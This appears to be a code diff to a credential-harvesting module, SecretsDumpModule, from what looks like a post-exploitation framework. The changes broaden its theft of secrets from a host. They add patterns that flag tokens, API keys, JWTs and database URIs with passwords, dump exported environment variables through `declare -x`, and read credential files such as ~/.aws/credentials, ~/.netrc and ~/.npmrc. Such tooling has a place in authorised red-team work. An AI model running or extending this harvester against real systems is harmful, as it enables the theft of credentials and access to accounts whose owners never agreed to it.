@@ -18,9 +18,29 @@ ENV_CRED_PATTERNS = re.compile(
     re.IGNORECASE
 )
 
-ENV_VAR_PATTERNS = re.compile(
-    r'(aws|azure|gcp|api|secret|token|password|user|key|docker|github|gitlab|npm|ruby|python)',
-    re.IGNORECASE
+_SENSITIVE_KEY_PARTS = (
+    "pass", "pwd", "secret", "token", "api", "auth", "cred",
+    "key", "jwt", "bearer", "database", "db_", "_db", "dsn",
+    "connection", "conn_", "_conn", "url", "uri",
+    "aws", "azure", "gcp", "google", "github", "gitlab",
+    "docker", "kube", "vault", "consul",
+    "private", "encrypt", "sign", "cert", "pfx", "pem",
+    "ldap", "smtp", "mail", "slack", "webhook",
+)
+
+_SENSITIVE_VALUE_RE = re.compile(
+    r'(?:'
+    r'(?:password|passwd|pass)\s*[:=]\s*\S+'
+    r'|[A-Z0-9]{20}[A-Z0-9/+]{30,}'
+    r'|ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
+    r'|ghp_[A-Za-z0-9]{30,}'
+    r'|glpat-[A-Za-z0-9_-]{20,}'
+    r'|AIza[0-9A-Za-z_-]{35}'
+    r'|postgres://\S+:\S+@'
+    r'|mysql://\S+:\S+@'
+    r'|mongodb(?:\+srv)?://\S+:\S+@'
+    r')',
+    re.IGNORECASE,
 )
 
 
@@ -92,8 +112,14 @@ def parse_ssh_config(content: str) -> Dict[str, Dict[str, str]]:
     return result
 
 
+def _is_interesting(key: str, value: str) -> bool:
+    kl = key.lower()
+    if any(part in kl for part in _SENSITIVE_KEY_PARTS):
+        return True
+    return bool(_SENSITIVE_VALUE_RE.search(value))
+
+
 def filter_env_vars(content: str) -> Dict[str, str]:
-    """Filter environment variables for credential patterns."""
     result = {}
     for line in content.split('\n'):
         line = line.strip()
@@ -102,7 +128,7 @@ def filter_env_vars(content: str) -> Dict[str, str]:
         key, val = line.split('=', 1)
         key = key.strip()
         val = val.strip()
-        if ENV_VAR_PATTERNS.search(key) and val:
+        if _is_interesting(key, val):
             result[key] = val
     return result
 
@@ -285,15 +311,24 @@ class SecretsDumpModule(KoiModule):
         return result
 
     def _hunt_env_vars(self) -> dict:
-        """Extract interesting environment variables."""
         result = {}
-
-        env_output = self._try_exec("env")
-        if env_output:
-            filtered = filter_env_vars(env_output)
-            if filtered:
-                result["Sensitive Env Vars"] = filtered
-
+        raw = self._try_exec("declare -x")
+        if not raw:
+            return result
+        env: Dict[str, str] = {}
+        for line in raw.splitlines():
+            line = line.strip()
+            if not line or "=" not in line:
+                continue
+            if line.startswith("declare -x "):
+                line = line[11:]
+            key, _, val = line.partition("=")
+            key = key.strip()
+            if key:
+                env[key] = val
+        interesting = {k: v for k, v in env.items() if _is_interesting(k, v)}
+        if interesting:
+            result["Sensitive Env Vars"] = interesting
         return result
 
     def _hunt_pgpass(self) -> dict:
@@ -315,9 +350,7 @@ class SecretsDumpModule(KoiModule):
         return result
 
     def _hunt_api_keys(self) -> dict:
-        """Hunt for API keys in common locations."""
         result = {}
-
         locations = [
             "~/.netrc",
             "~/.aws/credentials",
@@ -327,15 +360,15 @@ class SecretsDumpModule(KoiModule):
             "~/.npmrc",
             "~/.gem/credentials",
             "~/.token",
-            "~/.secrets"
+            "~/.secrets",
         ]
-
-        cmd = f"cat {' '.join(locations)} 2>/dev/null | head -20"
-        output = self._try_exec(cmd)
-
+        parts = " ".join(
+            f'[ -s {loc} ] && printf "\\n=== {loc} ===\\n" && head -20 {loc};'
+            for loc in locations
+        )
+        output = self._try_exec(parts)
         if output and output.strip():
             result["API Keys & Configs"] = output
-
         return result
 
     def _hunt_aws(self) -> dict:
